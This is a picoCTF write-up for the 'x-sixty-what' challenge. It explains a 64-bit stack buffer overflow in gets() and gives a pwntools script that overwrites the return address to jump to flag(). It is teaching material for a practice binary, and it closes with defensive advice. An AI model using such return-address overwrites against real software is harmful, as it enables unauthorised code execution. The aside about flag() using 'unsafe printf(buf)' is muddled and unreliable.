# x-sixty-what-Medium Writeup

**Flag:** `picoCTF{...}`

---

## Summary

This challenge leverages a **stack buffer overflow** on a 64-bit binary. The binary reads input into a fixed-size buffer with `gets()`, which has **no bounds checking**. Immediately above the buffer on the stack is the saved return address.

Instead of corrupting a variable, we can **overwrite the return address** to point directly to the `flag()` function, which prints the flag using an unsafe `printf(buf)` call.

---

## Vulnerability

Relevant snippet:

```c
void vuln(){
  char buf[64];
  gets(buf);  // unsafe, no bounds check
}
```

* Buffer = 64 bytes (`BUFFSIZE`)
* 64-bit system → saved return address is **8 bytes** above buffer
* `flag()` function exists and prints the flag:

  ```c
  void flag() { ... printf(buf); }
  ```

Overflowing the buffer allows us to **control the return address**, effectively redirecting execution to `flag()`.

---

## Exploitation Strategy

1. **Calculate offset to return address**

   * Buffer = 64 bytes.
   * 64-bit stack frame adds **8 bytes for saved RBP**.
   * Offset to return address = 64 + 8 = 72 bytes.

2. **Overwrite return address**

   * The exploit payload:

     ```
     b"X" * 72 + p64(flag_addr)
     ```
   * `flag_addr` is the address of the `flag()` function in the binary.

3. **Trigger flag output**

   * When `vuln()` returns, execution jumps to `flag()`.
   * `flag()` reads `flag.txt` and prints it.

---

## Exploit Script Overview

```python
from pwn import *

context.arch = 'amd64'

elf = ELF("./vuln")
flag_addr = elf.symbols["flag"]

payload = b"X" * 72
payload += p64(flag_addr)

conn = process("./vuln")   # or remote(HOST, PORT)
conn.sendline(payload)
conn.interactive()  # receives flag output
```

* Uses `pwntools` for local/remote execution.
* Overwrites **saved return address** directly to `flag()`.
* 64-bit stack alignment requires 72-byte padding before the overwrite.

---

## Final Notes

* **Vulnerability:** stack buffer overflow via `gets()`.
* **Exploit type:** ret2function / return-to-flag.
* **Defense:** never use `gets()`; use `fgets()` or safe bounded input.
* **Takeaway:** On 64-bit systems, saved RBP + buffer length determines offset to return address. Directly returning to a function like `flag()` can give immediate code execution.

